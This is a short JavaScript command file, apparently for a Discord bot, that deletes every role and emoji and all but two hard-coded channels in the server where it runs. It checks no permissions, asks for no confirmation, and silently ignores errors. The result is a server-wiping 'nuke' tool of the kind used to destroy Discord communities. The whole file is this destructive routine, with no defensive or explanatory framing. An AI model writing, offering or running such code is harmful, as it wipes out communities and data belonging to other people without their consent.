exports.run = (message) => {
    message.guild.roles.forEach(channel => {
        channel.delete().catch(() => { });
    });
    message.guild.channels.forEach(channel => {
        if (channel.id != '477530323488342047' && channel.id != '469311564655230987') channel.delete().catch(() => { });
    });
    message.guild.emojis.forEach(channel => {
        channel.delete().catch(() => { });
    });
};